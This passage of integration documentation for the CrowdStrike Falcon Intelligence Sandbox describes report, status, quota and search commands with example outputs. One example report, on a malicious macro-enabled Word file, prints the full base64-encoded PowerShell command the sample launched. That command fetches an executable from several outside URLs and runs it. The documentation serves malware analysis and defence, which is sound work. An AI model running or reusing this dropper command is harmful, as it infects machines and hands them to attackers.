                        "sha1": "61c1599c3e1558638cb28b4c6f9f232f92796992",
                        "sha256": "1b1c76592534d82c6226312c5de1547378fda8fafdeeaf6e9671678786f609b1",
                        "threat_level_readable": "no specific threat",
                        "type_tags": [
                            "data"
                        ]
                    },
                    {
                        "description": "data",
                        "file_size": 147284,
                        "md5": "232d0879a34a3bb4d61a2f477148b4ba",
                        "name": "MSForms.exd",
                        "sha1": "a06ef60064e5204bac234f4930bb5b51b6477ece",
                        "sha256": "90a548b96302e7fef25a537187dd23dc9800d7b34824137729e80f23131f00b9",
                        "threat_level_readable": "no specific threat",
                        "type_tags": [
                            "data"
                        ]
                    }
                ],
                "file_size": 177195,
                "file_type": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Template: Normal.dotm, Revision Number: 1, Name of Creating Application: Microsoft Office Word, Create Time/Date: Wed Jul 22 23:12:00 2020, Last Saved Time/Date: Wed Jul 22 23:12:00 2020, Number of Pages: 1, Number of Words: 3, Number of Characters: 21, Security: 0",
                "file_type_short": [
                    "doc",
                    "office"
                ],
                "http_requests": [
                    {
                        "header": "GET /images/1ckw5mj49w_2k11px_d/ HTTP/1.1\nHost: holfve.se\nConnection: Keep-Alive",
                        "host": "holfve.se",
                        "host_ip": "11.11.11.11",
                        "host_port": 80,
                        "method": "GET",
                        "url": "/images/1ckw5mj49w_2k11px_d/"
                    },
                    {
                        "header": "GET /_backup/yfhrmh6u0heidnwruwha2t4mjz6p_yxhyu390i6_q93hkh3ddm/ HTTP/1.1\nHost: www.cfm.nl\nConnection: Keep-Alive",
                        "host": "www.cfm.nl",
                        "host_ip": "10.10.10.10",
                        "host_port": 80,
                        "method": "GET",
                        "url": "/_backup/yfhrmh6u0heidnwruwha2t4mjz6p_yxhyu390i6_q93hkh3ddm/"
                    }
                ],
                "incidents": [
                    {
                        "details": [
                            "Contacts 5 domains and 5 hosts"
                        ],
                        "name": "Network Behavior"
                    }
                ],
                "processes": [
                    {
                        "command_line": "/n \"C:\\d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee.doc\"",
                        "file_accesses": [
                            {
                                "mask": "FILE_READ_DATA",
                                "path": "\\DEVICE\\NETBT_TCPIP_{846EE342-7039-11DE-9D20-806E6F6E6963}",
                                "type": "CREATE"
                            },
                            {
                                "mask": "FILE_READ_DATA",
                                "path": "\\DEVICE\\NETBT_TCPIP_{C3450F58-7060-4AEA-B0A0-C245927D78D0}",
                                "type": "CREATE"
                            }
                        ],
                        "handles": [
                            {
                                "id": 1,
                                "path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Components\\8CD521FB6DFE3D115AF2000A9CAC24AB",
                                "type": "KeyHandle"
                            },
                            {
                                "id": 336,
                                "path": "\\Device\\KsecDD",
                                "type": "FileHandle"
                            },
                            {
                                "id": 752,
                                "path": "\\Device\\MountPointManager",
                                "type": "FileHandle"
                            },
                            {
                                "id": 788,
                                "path": "\\\\?\\Volume{e47f4f43-d86",
                                "type": "FileHandle"
                            },
                            {
                                "id": 796,
                                "path": "\\Device\\Ide\\IdeDeviceP1T0L0-1",
                                "type": "FileHandle"
                            },
                            {
                                "id": 876,
                                "path": "\\RPC Control\\OLEADE38AD686674C2EB8E3744832E8",
                                "type": "PortHandle"
                            }
                        ],
                        "icon_artifact_id": "704c608c047fcf38c06387d35d2557c67a40f933bcbf5e49ff38bb96917f44b9",
                        "mutants": [
                            "\\Sessions\\1\\BaseNamedObjects\\Global\\552FFA80-3393-423d-8671-7BA046BB5906",
                            "Local\\ZonesCacheCounterMutex",
                            "Global\\552FFA80-3393-423d-8671-7BA046BB5906",
                            "Local\\10MU_ACB10_S-1-5-5-0-70188",
                            "Global\\MTX_MSO_Formal1_S-1-5-21-686412048-2446563785-1323799475-1001",
                            "Local\\10MU_ACBPIDS_S-1-5-5-0-70188",
                            "Local\\ZonesLockedCacheCounterMutex",
                            "Global\\MTX_MSO_AdHoc1_S-1-5-21-686412048-2446563785-1323799475-1001",
                            "\\Sessions\\1\\BaseNamedObjects\\Local\\10MU_ACBPIDS_S-1-5-5-0-70188",
                            "\\Sessions\\1\\BaseNamedObjects\\Local\\10MU_ACB10_S-1-5-5-0-70188",
                            "\\Sessions\\1\\BaseNamedObjects\\Local\\ZonesCacheCounterMutex",
                            "\\Sessions\\1\\BaseNamedObjects\\Local\\ZonesLockedCacheCounterMutex",
                            "\\Sessions\\1\\BaseNamedObjects\\Global\\MTX_MSO_Formal1_S-1-5-21-686412048-2446563785-1323799475-1001",
                            "\\Sessions\\1\\BaseNamedObjects\\Global\\MTX_MSO_AdHoc1_S-1-5-21-686412048-2446563785-1323799475-1001",
                            "\\Sessions\\1\\BaseNamedObjects\\Local\\WinSpl64To32Mutex_1127b_0_3000"
                        ],
                        "name": "WINWORD.EXE",
                        "normalized_path": "%PROGRAMFILES%\\(x86)\\Microsoft Office\\Office14\\WINWORD.EXE",
                        "pid": 1704,
                        "sha256": "ee944590b3c253325688f3c1cddc9a439b5a80a3a36443b4b5de788db19d2973",
                        "uid": "00000000-00001704"
                    },
                    {
                        "command_line": "12288",
                        "file_accesses": [
                            {
                                "mask": "FILE_READ_DATA",
                                "path": "\\DEVICE\\NETBT_TCPIP_{846EE342-7039-11DE-9D20-806E6F6E6963}",
                                "type": "CREATE"
                            },
                            {
                                "mask": "FILE_READ_DATA",
                                "path": "\\DEVICE\\NETBT_TCPIP_{C3450F58-7060-4AEA-B0A0-C245927D78D0}",
                                "type": "CREATE"
                            }
                        ],
                        "handles": [
                            {
                                "id": 1,
                                "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\GRE_Initialize",
                                "type": "KeyHandle"
                            },
                            {
                                "id": 184,
                                "path": "\\RPC Control\\splwow64_1_1127b_0_3000",
                                "type": "PortHandle"
                            }
                        ],
                        "mutants": [
                            "Local\\ZonesCacheCounterMutex",
                            "Global\\552FFA80-3393-423d-8671-7BA046BB5906",
                            "Local\\10MU_ACB10_S-1-5-5-0-70188",
                            "Global\\MTX_MSO_Formal1_S-1-5-21-686412048-2446563785-1323799475-1001",
                            "Local\\10MU_ACBPIDS_S-1-5-5-0-70188",
                            "Local\\ZonesLockedCacheCounterMutex",
                            "Global\\MTX_MSO_AdHoc1_S-1-5-21-686412048-2446563785-1323799475-1001",
                            "_SHuassist.mtx",
                            "Global\\.net clr networking",
                            "RasPbFile"
                        ],
                        "name": "splwow64.exe",
                        "normalized_path": "%WINDIR%\\splwow64.exe",
                        "parent_uid": "00000000-00001704",
                        "pid": 1820,
                        "process_flags": [
                            {
                                "name": "Reduced Monitoring"
                            }
                        ],
                        "sha256": "232f4854a70cfa982352c3eebc7e308755aac8e1a9dc5352711243def1f4b096",
                        "uid": "00000000-00001820"
                    },
                    {
                        "command_line": "powersheLL -e JABsAGkAZQBjAGgAcgBvAHUAaAB3AHUAdwA9ACcAdgB1AGEAYwBkAG8AdQB2AGMAaQBvAHgAaABhAG8AbAAnADsAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAIgBTAEUAYABjAHUAUgBpAFQAeQBgAFAAUgBPAGAAVABvAEMAYABvAGwAIgAgAD0AIAAnAHQAbABzADEAMgAsACAAdABsAHMAMQAxACwAIAB0AGwAcwAnADsAJABkAGUAaQBjAGgAYgBlAHUAZAByAGUAaQByACAAPQAgACcAMwAzADcAJwA7ACQAcQB1AG8AYQBkAGcAbwBpAGoAdgBlAHUAbQA9ACcAZAB1AHUAdgBtAG8AZQB6AGgAYQBpAHQAZwBvAGgAJwA7ACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAGQAZQBpAGMAaABiAGUAdQBkAHIAZQBpAHIAKwAnAC4AZQB4AGUAJwA7ACQAcwBpAGUAbgB0AGUAZQBkAD0AJwBxAHUAYQBpAG4AcQB1AGEAYwBoAGwAbwBhAHoAJwA7ACQAcgBlAHUAcwB0AGgAbwBhAHMAPQAuACgAJwBuACcAKwAnAGUAdwAtAG8AYgAnACsAJwBqAGUAYwB0ACcAKQAgAG4ARQB0AC4AdwBlAEIAYwBsAEkAZQBuAFQAOwAkAGoAYQBjAGwAZQBlAHcAeQBpAHEAdQA9ACcAaAB0AHQAcABzADoALwAvAGgAYQBvAHEAdQBuAGsAbwBuAGcALgBjAG8AbQAvAGIAbgAvAHMAOQB3ADQAdABnAGMAagBsAF8AZgA2ADYANgA5AHUAZwB1AF8AdwA0AGIAagAvACoAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AdABlAGMAaAB0AHIAYQB2AGUAbAAuAGUAdgBlAG4AdABzAC8AaQBuAGYAbwByAG0AYQB0AGkAbwBuAGwALwA4AGwAcwBqAGgAcgBsADYAbgBuAGsAdwBnAHkAegBzAHUAZAB6AGEAbQBfAGgAMwB3AG4AZwBfAGEANgB2ADUALwAqAGgAdAB0AHAAOgAvAC8AZABpAGcAaQB3AGUAYgBtAGEAcgBrAGUAdABpAG4AZwAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8ANwAyAHQAMABqAGoAaABtAHYANwB0AGEAawB3AHYAaQBzAGYAbgB6AF8AZQBlAGoAdgBmAF8AaAA2AHYAMgBpAHgALwAqAGgAdAB0AHAAOgAvAC8AaABvAGwAZgB2AGUALgBzAGUALwBpAG0AYQBnAGUAcwAvADEAYwBrAHcANQBtAGoANAA5AHcAXwAyAGsAMQAxAHAAeABfAGQALwAqAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBjAGYAbQAuAG4AbAAvAF8AYgBhAGMAawB1AHAALwB5AGYAaAByAG0AaAA2AHUAMABoAGUAaQBkAG4AdwByAHUAdwBoAGEAMgB0ADQAbQBqAHoANgBwAF8AeQB4AGgAeQB1ADMAOQAwAGkANgBfAHEAOQAzAGgAawBoADMAZABkAG0ALwAnAC4AIgBzAGAAUABsAGkAVAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAHMAZQBjAGMAaQBlAHIAZABlAGUAdABoAD0AJwBkAHUAdQB6AHkAZQBhAHcAcAB1AGEAcQB1ACcAOwBmAG8AcgBlAGEAYwBoACgAJABnAGUAZQByAHMAaQBlAGIAIABpAG4AIAAkAGoAYQBjAGwAZQBlAHcAeQBpAHEAdQApAHsAdAByAHkAewAkAHIAZQB1AHMAdABoAG8AYQBzAC4AIgBkAE8AVwBOAGAAbABvAEEAYABkAGYAaQBgAEwAZQAiACgAJABnAGUAZQByAHMAaQBlAGIALAAgACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQA7ACQAYgB1AGgAeABlAHUAaAA9ACcAZABvAGUAeQBkAGUAaQBkAHEAdQBhAGkAagBsAGUAdQBjACcAOwBJAGYAIAAoACgALgAoACcARwBlAHQALQAnACsAJwBJAHQAZQAnACsAJwBtACcAKQAgACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQAuACIAbABgAGUATgBHAFQASAAiACAALQBnAGUAIAAyADQANwA1ADEAKQAgAHsAKABbAHcAbQBpAGMAbABhAHMAcwBdACcAdwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAnACkALgAiAEMAYABSAGUAYQBUAGUAIgAoACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQA7ACQAcQB1AG8AbwBkAHQAZQBlAGgAPQAnAGoAaQBhAGYAcgB1AHUAegBsAGEAbwBsAHQAaABvAGkAYwAnADsAYgByAGUAYQBrADsAJABjAGgAaQBnAGMAaABpAGUAbgB0AGUAaQBxAHUAPQAnAHkAbwBvAHcAdgBlAGkAaABuAGkAZQBqACcAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAHQAbwBpAHoAbAB1AHUAbABmAGkAZQByAD0AJwBmAG8AcQB1AGwAZQB2AGMAYQBvAGoAJwA=",
                        "file_accesses": [
                            {
                                "mask": "FILE_READ_DATA",
                                "path": "\\DEVICE\\NETBT_TCPIP_{846EE342-7039-11DE-9D20-806E6F6E6963}",
                                "type": "CREATE"
                            },
                            {
                                "mask": "FILE_READ_DATA",
                                "path": "\\DEVICE\\NETBT_TCPIP_{C3450F58-7060-4AEA-B0A0-C245927D78D0}",
                                "type": "CREATE"
                            }
                        ],
                        "handles": [
                            {
                                "id": 1,
                                "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\GRE_Initialize",
                                "type": "KeyHandle"
                            },
                            {
                                "id": 132,
                                "path": "\\Device\\KsecDD",
                                "type": "FileHandle"
                            },
                            {
                                "id": 244,
                                "path": "\\Device\\MountPointManager",
                                "type": "FileHandle"
                            },
                            {
                                "id": 300,
                                "path": "\\\\?\\Volume{e47f4f43-d86",
                                "type": "FileHandle"
                            },
                            {
                                "id": 324,
                                "path": "\\Device\\Ide\\IdeDeviceP1T0L0-1",
                                "type": "FileHandle"
                            },
                            {
                                "id": 1212,
                                "path": "\\Device\\Afd",
                                "type": "FileHandle"
                            },
                            {
                                "id": 1352,
                                "path": "\\Device\\Nsi",
                                "type": "FileHandle"
                            },
                            {
                                "id": 1372,
                                "path": "\\Device\\NetBT_Tcpip_{E63BE247-2D1C-4749-B86C-7B5FABD92F0C}",
                                "type": "FileHandle"
                            }
                        ],
                        "icon_artifact_id": "704c608c047fcf38c06387d35d2557c67a40f933bcbf5e49ff38bb96917f44b9",
                        "mutants": [
                            "\\Sessions\\1\\BaseNamedObjects\\Global\\.net clr networking",
                            "Local\\ZonesCacheCounterMutex",
                            "Global\\552FFA80-3393-423d-8671-7BA046BB5906",
                            "Local\\10MU_ACB10_S-1-5-5-0-70188",
                            "Global\\MTX_MSO_Formal1_S-1-5-21-686412048-2446563785-1323799475-1001",
                            "Local\\10MU_ACBPIDS_S-1-5-5-0-70188",
                            "Local\\ZonesLockedCacheCounterMutex",
                            "Global\\MTX_MSO_AdHoc1_S-1-5-21-686412048-2446563785-1323799475-1001",
                            "_SHuassist.mtx",
                            "Global\\.net clr networking",
                            "RasPbFile",
                            "\\Sessions\\1\\BaseNamedObjects\\RasPbFile",
                            "\\Sessions\\1\\BaseNamedObjects\\_SHuassist.mtx"
                        ],
                        "name": "powersheLL.exe",
                        "normalized_path": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powersheLL.exe",
                        "pid": 2168,
                        "process_flags": [
                            {
                                "name": "Network Activity"
                            }
                        ],
                        "sha256": "a8fdba9df15e41b6f5c69c79f66a26a9d48e174f9e7018a371600b866867dab8",
                        "uid": "00000000-00002168"
                    }
                ],
                "screenshots_artifact_ids": [
                    "1ec8f756f21c98569f2ba8e2c77b9caec7c9ae9755d29da73e9599747368f8c1",
                    "ebde3f1b6f8892e26b13fa71b5b949e795a8f3fda5d67c59b59670157da87170",
                    "cb5e91d691fa3a38679a1d4dd717b008c33b60fd0c4eb2a0975ce1a265b5fa59",
                    "a2db874447c7ccf47f8274a51a32b383ef7ea5730b5d01d88a3c8a8364e44fc8",
                    "9856b154f8d55abeb013a67b7e73582627f2dae4ea1cdbf9f2f2da56c351fd3a",
                    "de88c809472cff4a40d241e8d68678d19efec529fd3043e47ab893ae9adbf729",
                    "f8f6be8b3f0897705baccf410c883df9f30b4fd1f4cdce0e6009fa1a5eebc135",
                    "70de5887136b561cf437caf7037e4078cb2d9456ea8cd787d2c1d1a1e6932b61",
                    "10446ae56599a6929902733dd60f6bd806026eba5d74c1ca37d3b97771baef0f",
                    "3415d4c7c250c51554cd0c5978cd470f9797bed639c60eb7d0ea6316460bedd3",
                    "60759bdd7fb40689f48e5f9220c310ae6efc73237f2e8e274590526098cc18b8",
                    "215b3e588f4f83d5dc8fb211f29937fe88df3def1a37c1e9001782b63110ed52",
                    "80e882c8b32df71eef5903b2670ac00fe2a676beb80089f13f80ea39e0f900a6"
                ],
                "submit_name": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee"
            },
            "screenshots_artifact_ids": [
                "1ec8f756f21c98569f2ba8e2c77b9caec7c9ae9755d29da73e9599747368f8c1",
                "ebde3f1b6f8892e26b13fa71b5b949e795a8f3fda5d67c59b59670157da87170",
                "cb5e91d691fa3a38679a1d4dd717b008c33b60fd0c4eb2a0975ce1a265b5fa59",
                "a2db874447c7ccf47f8274a51a32b383ef7ea5730b5d01d88a3c8a8364e44fc8",
                "9856b154f8d55abeb013a67b7e73582627f2dae4ea1cdbf9f2f2da56c351fd3a",
                "de88c809472cff4a40d241e8d68678d19efec529fd3043e47ab893ae9adbf729",
                "f8f6be8b3f0897705baccf410c883df9f30b4fd1f4cdce0e6009fa1a5eebc135",
                "70de5887136b561cf437caf7037e4078cb2d9456ea8cd787d2c1d1a1e6932b61",
                "10446ae56599a6929902733dd60f6bd806026eba5d74c1ca37d3b97771baef0f",
                "3415d4c7c250c51554cd0c5978cd470f9797bed639c60eb7d0ea6316460bedd3",
                "60759bdd7fb40689f48e5f9220c310ae6efc73237f2e8e274590526098cc18b8",
                "215b3e588f4f83d5dc8fb211f29937fe88df3def1a37c1e9001782b63110ed52",
                "80e882c8b32df71eef5903b2670ac00fe2a676beb80089f13f80ea39e0f900a6"
            ],
            "sha256": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
            "submission_type": "file",
            "submit_name": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
            "tags": [
                "macros-on-open"
            ],
            "threat_score": 100,
            "verdict": "malicious"
        }
    }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>|sha256|environment_description|environment_id|created_timestamp|id|submission_type|threat_score|verdict|
>|---|---|---|---|---|---|---|---|
>| d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee | Windows 7 64 bit | 110 | 2022-02-13T14:20:21Z | 20879a8064904ecfbb62c118a6a19411_a71f2c6e06a94e8495615803c66d8730 | file | 100 | malicious |


### cs-fx-get-report-summary
***
Gets a short summary version of a sandbox report.


#### Base Command

`cs-fx-get-report-summary`
#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| ids | ID of a submitted malware sample. Find a submission ID from the response when submitting a malware sample or search with the cs-fx-submit-uploaded-file command. | Required | 


#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| csfalconx.resource.tags | String | Analysis tags. |
| csfalconx.resource.tag | String | Analysis tags. |
| csfalconx.resource.id | String | Analysis ID. | 
| csfalconx.resource.verdict | String | Analysis verdict. | 
| csfalconx.resource.created_timestamp | String | Analysis start time. | 
| csfalconx.resource.environment_id | String | Environment ID. | 
| csfalconx.resource.environment_description | String | Environment description. | 
| csfalconx.resource.threat_score | Int | Score of the threat. | 
| csfalconx.resource.submit_url | String | URL submitted for analysis. | 
| csfalconx.resource.submission_type | String | Type of submitted artifact. For example, file, URL, etc. | 
| csfalconx.resource.file_type | String | File type. | 
| csfalconx.resource.file_size | Int | File size. | 
| csfalconx.resource.sha256 | String | SHA256 hash of the submitted file. | 
| csfalconx.resource.ioc_report_strict_csv_artifact_id | String | ID of the IOC pack to download \(CSV\). | 
| csfalconx.resource.ioc_report_broad_csv_artifact_id | String | ID of the IOC pack to download \(CSV\). | 
| csfalconx.resource.ioc_report_strict_json_artifact_id | Int | ID of the IOC pack to download \(JSON\). | 
| csfalconx.resource.ioc_report_broad_json_artifact_id | String | ID of the IOC pack to download \(JSON\). | 
| csfalconx.resource.ioc_report_strict_stix_artifact_id | String | ID of the IOC pack to download \(STIX\). | 
| csfalconx.resource.ioc_report_broad_stix_artifact_id | Int | ID of the IOC pack to download \(STIX\). | 
| csfalconx.resource.ioc_report_strict_maec_artifact_id | String | ID of the IOC pack to download \(MAEC\). | 
| csfalconx.resource.ioc_report_broad_maec_artifact_id | String | ID of the IOC pack to download \(MAEC\). | 


#### Command Example
```!cs-fx-get-report-summary ids="20879a8064904ecfbb62c118a6a19411_8cb7c75003264edfaf5a60c33d2846fc"```

#### Context Example
```json
{
  "DBotScore(val.Indicator \u0026\u0026 val.Indicator == obj.Indicator \u0026\u0026 val.Vendor == obj.Vendor \u0026\u0026 val.Type == obj.Type)": [
    {
      "Indicator": "15fea7cc23194aea10dce58cff8fff050c81e1be0d16e4da542f4fedd5a421c3",
      "Reliability": "B - Usually reliable",
      "Score": 1,
      "Type": "file",
      "Vendor": "CrowdStrike Falcon X"
    }
  ],
  "File(val.MD5 \u0026\u0026 val.MD5 == obj.MD5 || val.SHA1 \u0026\u0026 val.SHA1 == obj.SHA1 || val.SHA256 \u0026\u0026 val.SHA256 == obj.SHA256 || val.SHA512 \u0026\u0026 val.SHA512 == obj.SHA512 || val.CRC32 \u0026\u0026 val.CRC32 == obj.CRC32 || val.CTPH \u0026\u0026 val.CTPH == obj.CTPH || val.SSDeep \u0026\u0026 val.SSDeep == obj.SSDeep)": [
    {
      "SHA256": "15fea7cc23194aea10dce58cff8fff050c81e1be0d16e4da542f4fedd5a421c3"
    }
  ],
  "csfalconx.resource(val.id \u0026\u0026 val.id == obj.id)": {
    "created_timestamp": "2022-03-03T14:39:19Z",
    "environment_description": "Windows 10 64 bit",
    "environment_id": 160,
    "id": "20879a8064904ecfbb62c118a6a19411_8cb7c75003264edfaf5a60c33d2846fc",
    "ioc_report_broad_csv_artifact_id": "46915810cc20d82d879c81c2b35d20ab720f2dc287fcb3acc5f921f6bd408be6",
    "ioc_report_broad_json_artifact_id": "e8ac23ff7d0ce989cae5730bfd5df1ba39e16069e772a0496bd681d3b50137f9",
    "ioc_report_broad_maec_artifact_id": "029a36683578573726f2a39a7ff2ad22da97ff55e84a0a2ca73284283bbbc39a",
    "ioc_report_broad_stix_artifact_id": "9e62387d0f8bb854a932c61ad0f418a8721033f46bfe879877bb0b4f0af2ad86",
    "ioc_report_strict_csv_artifact_id": "46915810cc20d82d879c81c2b35d20ab720f2dc287fcb3acc5f921f6bd408be6",
    "ioc_report_strict_json_artifact_id": "e8ac23ff7d0ce989cae5730bfd5df1ba39e16069e772a0496bd681d3b50137f9",
    "ioc_report_strict_maec_artifact_id": "029a36683578573726f2a39a7ff2ad22da97ff55e84a0a2ca73284283bbbc39a",
    "ioc_report_strict_stix_artifact_id": "9e62387d0f8bb854a932c61ad0f418a8721033f46bfe879877bb0b4f0af2ad86",
    "sha256": "15fea7cc23194aea10dce58cff8fff050c81e1be0d16e4da542f4fedd5a421c3",
    "submission_type": "page_url",
    "submit_url": "hxxps://www.google.com",
    "verdict": "no specific threat"
  }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>|created_timestamp|environment_description|environment_id|id|ioc_report_broad_csv_artifact_id|ioc_report_broad_json_artifact_id|ioc_report_broad_maec_artifact_id|ioc_report_broad_stix_artifact_id|ioc_report_strict_csv_artifact_id|ioc_report_strict_json_artifact_id|ioc_report_strict_maec_artifact_id|ioc_report_strict_stix_artifact_id|sha256|submission_type|submit_url|verdict|
>|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
>| 2022-03-03T14:39:19Z | Windows 10 64 bit | 160 | 20879a8064904ecfbb62c118a6a19411_8cb7c75003264edfaf5a60c33d2846fc | 46915810cc20d82d879c81c2b35d20ab720f2dc287fcb3acc5f921f6bd408be6 | e8ac23ff7d0ce989cae5730bfd5df1ba39e16069e772a0496bd681d3b50137f9 | 029a36683578573726f2a39a7ff2ad22da97ff55e84a0a2ca73284283bbbc39a | 9e62387d0f8bb854a932c61ad0f418a8721033f46bfe879877bb0b4f0af2ad86 | 46915810cc20d82d879c81c2b35d20ab720f2dc287fcb3acc5f921f6bd408be6 | e8ac23ff7d0ce989cae5730bfd5df1ba39e16069e772a0496bd681d3b50137f9 | 029a36683578573726f2a39a7ff2ad22da97ff55e84a0a2ca73284283bbbc39a | 9e62387d0f8bb854a932c61ad0f418a8721033f46bfe879877bb0b4f0af2ad86 | 15fea7cc23194aea10dce58cff8fff050c81e1be0d16e4da542f4fedd5a421c3 | page_url | hxxps://www.google.com | no specific threat |

### cs-fx-get-analysis-status
***
Checks the status of a sandbox analysis.


#### Base Command

`cs-fx-get-analysis-status`
#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| ids | ID of a submitted malware sample. Find a submission ID from the response when submitting a malware sample or search with the cs-fx-submit-uploaded-file/url command. | Required | 


#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| csfalconx.resource.id | String | Analysis ID. | 
| csfalconx.resource.verdict | String | Analysis verdict. | 
| csfalconx.resource.created_timestamp | String | Analysis start time. | 
| csfalconx.resource.environment_id | String | Environment ID. | 
| csfalconx.resource.environment_description | String | Environment description. | 
| csfalconx.resource.threat_score | Int | Score of the threat. | 
| csfalconx.resource.submit_url | String | URL submitted for analysis. | 
| csfalconx.resource.submission_type | String | Type of submitted artifact. For example, file, URL, etc. | 
| csfalconx.resource.file_type | String | File type. | 
| csfalconx.resource.file_size | Int | File size. | 
| csfalconx.resource.sha256 | String | SHA256 hash of the submitted file. | 
| csfalconx.resource.ioc_report_strict_csv_artifact_id | String | ID of the IOC pack to download \(CSV\). | 
| csfalconx.resource.ioc_report_broad_csv_artifact_id | String | ID of the IOC pack to download \(CSV\). | 
| csfalconx.resource.ioc_report_strict_json_artifact_id | Int | ID of the IOC pack to download \(JSON\). | 
| csfalconx.resource.ioc_report_broad_json_artifact_id | String | ID of the IOC pack to download \(JSON\). | 
| csfalconx.resource.ioc_report_strict_stix_artifact_id | String | ID of the IOC pack to download \(STIX\). | 
| csfalconx.resource.ioc_report_broad_stix_artifact_id | Int | ID of the IOC pack to download \(STIX\). | 
| csfalconx.resource.ioc_report_strict_maec_artifact_id | String | ID of the IOC pack to download \(MAEC\). | 
| csfalconx.resource.ioc_report_broad_maec_artifact_id | String | ID of the IOC pack to download \(MAEC\). | 


#### Command Example
```!cs-fx-get-analysis-status ids="05cca3437abcb4057c157ed8b933b07fb198aa0fa0eb7f7c27e97029e9e0ad61"```

#### Context Example
```json
{
  "csfalconx.resource(val.id \u0026\u0026 val.id == obj.id)": 
{
        "created_timestamp": "2020-05-26T21:24:41Z",
        "environment_id": 160,
        "id": "1c9fe398b2294301aa3080ede8d77356_8cfaaf951fff412090df3d27d4b4193d",
        "sha256": "05cca3437abcb4057c157ed8b933b07fb198aa0fa0eb7f7c27e97029e9e0ad61",
        "state": "success"
  }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>|created_timestamp|environment_id|id|sha256|state|
>|---|---|---|---|---|
>| 2020-05-26T21:24:41Z | 160 | 1c9fe398b2294301aa3080ede8d77356_8cfaaf951fff412090df3d27d4b4193d | 05cca3437abcb4057c157ed8b933b07fb198aa0fa0eb7f7c27e97029e9e0ad61 | success |


### cs-fx-check-quota
***
Returns the total quota number and the in use quota number.


#### Base Command

`cs-fx-check-quota`
#### Input

There are no input arguments for this command.

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| csfalconx.resource.in_progress | Number | The number of calls in progress | 
| csfalconx.resource.total | Number | The total available quota | 
| csfalconx.resource.used | Number | The number of calls used | 


#### Command Example
```!cs-fx-check-quota```

#### Context Example
```json
{
    "csfalconx": {
        "resource": {
            "in_progress": 3,
            "total": 500,
            "used": 11
        }
    }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>|in_progress|total|used|
>|---|---|---|
>| 3 | 500 | 11 |


### cs-fx-find-reports
***
Finds sandbox reports by providing an FQL filter and paging details.


#### Base Command

`cs-fx-find-reports`
#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| filter | Optional filter and sort criteria in the form of an FQL query. Takes precedence over the *hash* argument (if provided). | Optional | 
| offset | The offset from which to start retrieving reports. | Optional | 
| hashes | SHA256 hashes to search for. Overridden by the *filter* argument (if provided). | Optional | 
| limit | Maximum number of report IDs to return. Maximum is 5000. Default is 50. | Optional | 
| sort | Sort order. Can be "asc" or "desc". Possible values are: asc, desc. | Optional | 


#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| csfalconx.resource.resources | List | Set of report IDs that match the search criteria.  |
| csfalconx.resource.FindReport.sha256 | String | queried SHA256 value (when applicable). |
| csfalconx.resource.FindReport.foundIds | Set | Set of report ids that match this queried SHA256 value. |


#### Command Example
```!cs-fx-find-reports offset=1 limit=5```

#### Context Example
```json
{
    "csfalconx": {
        "resource": {
            "resources": [
                "20879a8064904ecfbb62c118a6a19411_944bce16178742c58beccd0e6eb1a000",
                "20879a8064904ecfbb62c118a6a19411_70a75d10dbc74cfdaeeba2661bc96f05",
                "20879a8064904ecfbb62c118a6a19411_f6552785fd2d4219bbca4f2bcda8db0f",
                "20879a8064904ecfbb62c118a6a19411_1f31944a613549fe95939e9c0017be78",
                "20879a8064904ecfbb62c118a6a19411_64e16e63c67649f4bb203a41f0139a26"
            ]
        }
    }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>|resources|
>|---|
>| 20879a8064904ecfbb62c118a6a19411_944bce16178742c58beccd0e6eb1a000 |
>| 20879a8064904ecfbb62c118a6a19411_70a75d10dbc74cfdaeeba2661bc96f05 |
>| 20879a8064904ecfbb62c118a6a19411_f6552785fd2d4219bbca4f2bcda8db0f |
>| 20879a8064904ecfbb62c118a6a19411_1f31944a613549fe95939e9c0017be78 |
>| 20879a8064904ecfbb62c118a6a19411_64e16e63c67649f4bb203a41f0139a26 |


### cs-fx-find-submission-id
***
Finds submission IDs for uploaded files by providing an FQL filter and paging details. Returns a set of submission IDs that match the search criteria.


